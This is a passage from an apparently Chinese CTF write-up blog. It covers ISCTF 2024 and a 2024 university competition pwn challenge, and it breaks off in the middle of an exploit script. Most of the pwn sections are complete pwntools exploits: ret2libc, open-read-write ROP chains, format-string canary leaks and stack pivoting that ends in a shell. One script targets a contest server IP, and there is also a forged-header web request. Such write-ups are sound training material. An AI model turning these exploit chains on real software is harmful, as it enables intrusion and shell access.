p64(ret)<br><span class="hljs-comment">#puts(bss1)</span><br>payload += p64(pop_rdi) + p64(bss1)<br>payload += p64(puts_plt)<br>sleep(<span class="hljs-number">0.2</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>实际上 0x100 字节刚刚好能够进行栈溢出并构造 orw 的 rop 链，因此可以不用进行栈迁移。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;27.25.151.12&#x27;</span>, <span class="hljs-number">24981</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4012F2</span><br>read = <span class="hljs-number">0x4012AD</span><br>bss = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x400</span><br>pop_rdi = <span class="hljs-number">0x4012ce</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdi) +p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.recvuntil(<span class="hljs-string">&quot;oh,what&#x27;s this?\n&quot;</span>)<br>p.sendline(payload)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>puts = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x16333a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x904a9</span><span class="hljs-comment">#pop rdx; pop rbx; ret;</span><br><br><span class="hljs-comment"># attach(p)</span><br><span class="hljs-comment">#read(0, bss, 0x40)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_addr)<br><span class="hljs-comment">#open(bss, 0, 0)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(open_addr)<br><span class="hljs-comment">#read(3, bss, 0x40)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_addr)<br><span class="hljs-comment">#puts(bss)</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(puts_plt)<br><span class="hljs-comment"># payload = payload.ljust(0x100, b&#x27;a&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;oh,what&#x27;s this?\n&quot;</span>)<br>p.send(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.send(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="小蓝鲨stack"><a href="#小蓝鲨stack" class="headerlink" title="小蓝鲨stack"></a>小蓝鲨stack</h3><p>main 函数存在栈溢出</p><img src="/post/35326/1731414364370-0aa4893f-9f7f-49c2-b760-68d12cb66b78.png" class="" title="img"><p>gdb 调试，在 main 函数执行到 ret 之后会进入 __libc_start_main 函数，然后执行 exit 退出。</p><img src="/post/35326/1735483922045-42855962-b83d-49be-b6d7-99148d39c411.png" class="" title="img"><p>我们可以在 libc 中找到 <code>call exit</code> 这个位置，修改返回地址的最后一个字节为 0x7c，使得程序能够重新执行 main 函数，同时也会泄露出 libc。</p><img src="/post/35326/1731406123006-6af2932e-27a4-4fd1-99b0-f4a85e2f74a9.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc-2.31_9.16.so&#x27;)</span><br><span class="hljs-comment"># elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># p = remote(&#x27;27.25.151.12&#x27;, 36144)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>main = <span class="hljs-number">0x4011DB</span><br>pop_rdi = <span class="hljs-number">0x401293</span><br>ret = <span class="hljs-number">0x40101a</span><br><br><span class="hljs-comment"># attach(p)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p8(<span class="hljs-number">0x7c</span>)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(addr)))<br><br>libc_base = addr - <span class="hljs-number">0x2407c</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system) + p64(<span class="hljs-number">0</span>)<br>p.sendline(payload)<br>p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>看了其他师傅的 wp， 由于这道题没有开 pie ，所以实际上也是 ret2libc 的板子题，只不过需要多用几次 ret 来平衡堆栈。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc-2.31_9.16.so&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;27.25.151.12&#x27;, 36144)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main = <span class="hljs-number">0x4011DF</span><br>pop_rdi = <span class="hljs-number">0x401293</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>attach(p)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>payload += p64(pop_rdi) + p64(printf_got)<br>payload+= p64(ret) + p64(printf_plt)<br>payload += p64(ret) + p64(main)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\x40&#x27;</span>)<br>printf_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;printf_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(printf_addr)))<br><br>libc_base = printf_addr - libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>payload += p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h3><p>程序保护全开</p><img src="/post/35326/1735386491238-542073c1-8867-4c78-bbc7-560c84cf45a8.png" class="" title="img"><p>main 函数，存在一个格式化字符串漏洞</p><img src="/post/35326/1735386465712-c9dce7c2-3ff6-4eb1-9757-d880478afda1.png" class="" title="img"><p>vuln 函数，溢出一个字节，所谓的 off-by-one 漏洞</p><img src="/post/35326/1735386611672-980f710b-c82c-4a46-9521-1674394dee7b.png" class="" title="img"><p>泄露出栈地址、libc 地址和 canary，然后栈迁移执行 one_gadget。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br><br><span class="hljs-comment"># attach(p, &#x27;b *$rebase(0x1359)&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;that?\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;gift!\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;%15$p%11$p%9$p&#x27;</span><br>p.send(payload)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;stack:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(stack)))<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br><br>one_gadget = libc_base + <span class="hljs-number">0xebc81</span><br>rbp = stack - <span class="hljs-number">0x160</span><br>success(<span class="hljs-string">&#x27;rbp:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(rbp)))<br>rbp1 = stack - <span class="hljs-number">0xc8</span><br>success(<span class="hljs-string">&#x27;rbp1:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(rbp1)))<br><br>payload = p64(canary) + p64(rbp1) + p64(one_gadget)<br>payload += p64(canary) + p8(rbp&amp;<span class="hljs-number">0xFF</span>)<br>p.recvuntil(<span class="hljs-string">&quot;again?????\n&quot;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="25时晓山瑞希生日会"><a href="#25时晓山瑞希生日会" class="headerlink" title="25时晓山瑞希生日会"></a>25时晓山瑞希生日会</h3><p>http 修改请求头</p><img src="/post/35326/1731313225414-d7b64776-a98e-4bbc-a250-92426f6fed02.png" class="" title="img"><p>请求如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Project Sekai<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 27 Aug 2024 10:00:00 GMT<br></code></pre></td></tr></table></figure><img src="/post/35326/1731313449061-15bdab86-92f9-445c-8626-a58def51ae9c.png" class="" title="img"><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="小蓝鲨的签到02"><a href="#小蓝鲨的签到02" class="headerlink" title="小蓝鲨的签到02"></a>小蓝鲨的签到02</h3><p>010Editor 打开</p><img src="/post/35326/1731160718877-c1b98dff-8483-4a8c-925f-2432357685ba.png" class="" title="img"><p>ISCTF{blueshark!_@#2024$%^&amp;*}</p><h3 id="数字迷雾：在像素中寻找线索"><a href="#数字迷雾：在像素中寻找线索" class="headerlink" title="数字迷雾：在像素中寻找线索"></a>数字迷雾：在像素中寻找线索</h3><p>随波逐流一把梭</p><img src="/post/35326/1731727614112-92f38fca-ff5e-438b-bf47-0695f6ab6aad.png" class="" title="img"><p>ISCTF{+9qn1DKdun!glAK}</p><h3 id="游园地1"><a href="#游园地1" class="headerlink" title="游园地1"></a>游园地1</h3><img src="/post/35326/1731313164140-63385a14-ff83-4b74-bc1d-3f0b4141e086.jpeg" class="" title="img"><p>ISCTF{湖北省_武汉市_江汉区_中山公园}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024年京津冀大学生信息安全网络攻防大赛-决赛Pwn</title>
    <link href="/post/11394.html"/>
    <url>/post/11394.html</url>
    
    <content type="html"><![CDATA[<p>这个决赛两道Web，一道Pwn，Pwn题最后也没做出来，不过做出来的队伍也不多，后面找做出来的师傅交流了下，然后参照wp进行复现。</p><h1 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h1><p>pwn 函数，有两次对 bss 段的读入，最后一次读入存在 0x9 字节的溢出，然而这个溢出字节数只能覆盖 rbp 以及返回地址的一个字节，因此只能考虑栈迁移</p><img src="/post/11394/1740391556466-d624c273-9e93-4511-a95c-956efadcbea8.png" class="" title="img"><p>一般上我们在栈迁移的时候需要将返回地址覆盖成 leave; ret，这就需要至少溢出 0x10 字节，而现在我们只能覆盖返回地址的一字节</p><p>我们 gdb 调试一下，可以看到 pwn 函数的返回地址是 0x400794，而 leave; ret 的地址是 0x40071f，两者相差了一个字节，而我们正好可以覆盖返回地址的一个字节。</p><img src="/post/11394/1740400797062-915c0535-82f6-4f8a-b6bd-744526663b07.png" class="" title="img"><img src="/post/11394/1740400989385-af0aac26-ea30-41ec-b728-1a47c561d114.png" class="" title="img"><p>那么我们既然可以进行栈迁移，就可以考虑将栈迁移到 bss 段，而 pwn 函数中正好有两次向 bss 段的读入，第一次是 one，其地址是 0x601160，第二次是 two，其地址是 0x601060；我们可以选择将栈迁移到 one 处，然后进行 libc 泄露</p><p>第一次读入我们布置好泄露 puts 函数的 rop 链，第二次任意写入，第三次我们将 rbp 覆盖为 one-8 ，而减 8 是为了抵消第二次 leave 时导致的 rsp+8；然后将返回地址一字节写入 \x1f，这样就相当于将返回地址改成了 leave; ret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pwn = <span class="hljs-number">0x4006A6</span><br>read_two = <span class="hljs-number">0x4006EA</span><br>one = <span class="hljs-number">0x601160</span><br>two = <span class="hljs-number">0x601060</span><br>pop_rdi = <span class="hljs-number">0x400803</span><br>pop_rbp = <span class="hljs-number">0x400610</span><br>leave_ret = <span class="hljs-number">0x40071f</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    attach(p, <span class="hljs-string">&#x27;b *0x40071E&#x27;</span>)<br>    pause()<br><br>debug()<br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Want leave something?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;So, Bye?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(one-<span class="hljs-number">8</span>) + <span class="hljs-string">b&#x27;\x1f&#x27;</span><br>p.send(payload)<br></code></pre></td></tr></table></figure><p>可以看到，现在 rbp 已经覆盖成了 one-8，返回地址也变成了 leave; ret</p><img src="/post/11394/1740402009908-0c061719-9fb2-412a-bfb7-ec5a0fa1f364.png" class="" title="img"><p>经过两次 leave; ret 之后，栈已经被迁移到了 one 处，然后就会执行泄露 puts 函数的 rop 链</p><img src="/post/11394/1740402048838-72dd896b-bb29-4758-b80b-c876851b65c2.png" class="" title="img"><p>当我们成功泄露出了 puts 函数之后，程序已经退出了</p><img src="/post/11394/1740402091123-a7de469e-6080-4692-8221-935f50d65c11.png" class="" title="img"><p>现在我们还需要有再次读入的机会来布置 getshell 的 rop 链，那么我们就可以修改泄露第一次读入的 rop 链，使其能在泄露 puts 函数之后有再次读入的机会</p><p>可以看到在第二次读入的汇编代码处，我们可以在泄露出 pus 函数之后返回到这个位置，这样我们就可以有两次读入的机会。第一次读入有 0x40 字节，我们可以布置 getshell 的 rop 链，第二次任意读入，之后程序会来到 leave 处，也就是会执行 <code>mov rsp, rbp</code>和 <code>pop rbp</code>，但是此时 rbp 已经变成了 0，再执行 <code>mov rsp, rbp</code>就会出错，由于我们需要程序执行getshell的rop链，因此我们可以用 <code>pop rbp</code>将 rbp 恢复成 two。</p><img src="/post/11394/1740402355762-a1072329-999b-484b-83fc-f445c51dc373.png" class="" title="img"><p>现在我们修改泄露 puts 函数的 rop 链，将 rbp 变成 two，然后返回到 0x4006EA 处</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">debug()<br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)<br>payload += p64(pop_rbp) + p64(two) + p64(read_two)<br>p.send(payload)<br></code></pre></td></tr></table></figure><p>执行到此处是第一次读入</p><img src="/post/11394/1740403650319-89c996b9-3177-4fc9-b5bd-9ff01d127081.png" class="" title="img"><p>布置好 execve 的 rop 链和第二次任意读入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">debug()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(binsh)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>payload += p64(execve)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;So, Bye?&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br></code></pre></td></tr></table></figure><img src="/post/11394/1740403821142-bc3b1e68-a940-4ed7-a11d-8d9a3fb310e5.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./2.27-3ubuntu1.2_amd64/libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_two = <span class="hljs-number">0x4006EA</span><br>one = <span class="hljs-number">0x601160</span><br>two = <span class="hljs-number">0x601060</span><br>pop_rdi = <span class="hljs-number">0x400803</span><br>pop_rbp = <span class="hljs-number">0x400610</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>attach(p, <span class="hljs-string">&#x27;b *0x40071E&#x27;</span>)<br>pause()<br><br><span class="hljs-comment"># debug()</span><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)<br>payload += p64(pop_rbp) + p64(two) + p64(read_two)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Want leave something?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;So, Bye?&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(one-<span class="hljs-number">8</span>) + <span class="hljs-string">b&#x27;\x1f&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts)))<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x23e8a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x1b96</span><br><br><span class="hljs-comment"># 